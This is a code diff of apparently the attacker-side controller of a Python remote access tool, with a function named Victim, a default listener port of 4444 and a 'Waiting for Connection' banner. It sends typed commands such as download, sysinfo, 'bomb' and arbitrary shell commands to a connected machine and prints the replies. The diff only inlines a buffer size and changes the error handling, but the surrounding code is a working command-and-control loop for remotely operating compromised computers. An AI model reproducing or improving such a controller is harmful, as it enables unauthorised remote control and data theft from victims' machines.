@@ -29,16 +29,13 @@ def Victim():
     print('')
 
 if __name__=="__main__":
-
     logo()
-
     LHOST = "127.0.0.1"
     LPORT = (input(" PORT : \033[1;36m"))
     if LPORT == '':
         print(" \033[1;mDEFAULT PORT -> \033[1;36m4444\033[1;m")
         LPORT = 4444
     LPORT = int(LPORT)
-    intBuff = 2048
     print("")
     print("\033[1;36m [+] Waiting for Connection...")
     server_connect()
@@ -46,7 +43,7 @@ if __name__=="__main__":
     try:
         while True:
                 
-            header = conn.recv(intBuff).decode("utf-8","ignore")
+            header = conn.recv(2048).decode("utf-8","ignore")
             command = input(header)
 
             if command == "download":
@@ -80,20 +77,18 @@ if __name__=="__main__":
 
             elif command == "sysinfo":
                 conn.send(command.encode())
-                system_data = conn.recv(intBuff).decode()
+                system_data = conn.recv(2048).decode()
                 print(system_data)
 
             elif command == "help":
                 conn.send(command.encode())
-                guide = conn.recv(intBuff).decode()
+                guide = conn.recv(2048).decode()
                 print(guide)
 
             elif command == "bomb":
                 conn.send(command.encode())
-                res = conn.recv(intBuff).decode()
+                res = conn.recv(2048).decode()
                 print(res)
-
-                
 
             else:
                 conn.send(command.encode())
@@ -103,5 +98,6 @@ if __name__=="__main__":
                     break
                 print(data)
 
-    except BrokenPipeError:
-        time.sleep
+    except Exception as ex:
+        print('\033[1;36mError Occurred !\033[1;m', ex)
+
